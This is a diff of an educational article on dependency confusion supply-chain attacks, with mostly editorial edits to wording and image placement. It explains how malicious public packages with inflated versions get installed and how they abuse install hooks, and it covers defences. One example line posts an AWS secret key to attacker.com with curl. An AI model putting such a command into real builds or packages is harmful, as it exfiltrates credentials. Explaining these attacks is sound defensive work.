@@ -1,7 +1,5 @@
 # Dependency Confusion Attack - Deep Dive & Attack Techniques
 
-![Header Image](../../assets/images/dependency-confusion.png)
-
 ## What is Dependency Confusion?
 
 Dependency confusion is a software supply chain attack where an attacker tricks a build system into installing a **malicious package from a public registry instead of a trusted internal one**.
@@ -10,6 +8,7 @@ Modern package managers like npm, pip, and Maven resolve dependencies based on *
 
 > In simple terms, the system installs what looks “newer” - not what is actually “trusted”.
 
+![Header Image](../../assets/images/dependency-confusion.png)
 
 ## How Dependency Confusion Attack Works?
 
@@ -19,9 +18,9 @@ Imagine an organization using an internal package named `internal-lib`. This pac
 
 An attacker discovers this package name (often through public code, logs, or misconfigurations) and publishes a package with the same name on a public registry. To increase the chances of it being selected, they assign it a higher version, such as `v99.0.0`.
 
-During the build process, the package manager queries available registries. If not explicitly configured, it may resolve the dependency from the public source - pulling the attacker’s package instead of the intended internal one.
+During the build process, the package manager queries available registries. If not explicitly configured, the package manager may resolve the dependency from the public registry.
 
-Once installed, the malicious package executes its payload during the install or build phase.
+Once installed, the malicious package executes its payload during the install or build phase. This happens because most package managers prioritize availability and versioning over trust boundaries between registries.
 
 > No exploit required - just abusing default behavior.
 
@@ -40,13 +39,13 @@ Attackers use these hooks to run arbitrary commands, download additional payload
 
 Build environments are often rich with sensitive data - API keys, tokens, and environment variables.
 
-A malicious package can silently collect and exfiltrate these secrets. A simple script is enough to send credentials to an external server:
+A malicious package can silently collect and exfiltrate these secrets. Even a simple script is enough to send credentials to an external server:
 
 ```bash
 curl -X POST attacker.com --data "$AWS_SECRET_ACCESS_KEY"
 ```
 
-Since this happens inside the build environment, it often goes unnoticed. Even if environment is protected by firewall, attackers can always find a way to send data out. One of the examples is DNS exfiltration as nicely explained in this this [article](https://www.akamai.com/glossary/what-is-dns-data-exfiltration) 
+Since this happens inside the build environment, it often goes unnoticed. Even if the environment is protected by a firewall, attackers can still find ways to exfiltrate data. One of the examples is DNS exfiltration as nicely explained in this [article](https://www.akamai.com/glossary/what-is-dns-data-exfiltration) 
 
 
 ### CI/CD Pipeline Abuse
@@ -88,7 +87,7 @@ Build System (CI/CD)
         Compromised Artifact Shipped
 ```
 
-## How to Prevent Dependency Confusions?
+## How to Prevent Dependency Confusion?
 
 There is no single fix for dependency confusion. Effective defense requires **layered controls across the build and dependency ecosystem**.
 
@@ -142,7 +141,7 @@ Dependency confusion is powerful because it doesn’t rely on breaking systems -
 
 > You don’t need to exploit a vulnerability if the system installs your code by design.
 
-In modern software development, controlling **what gets installed** is just as important as securing the code you write.
+In modern software development, controlling what gets installed is just as critical as securing the code you write - because in many cases, that code may not even be yours.
 
 ### 📢 Share this post
 
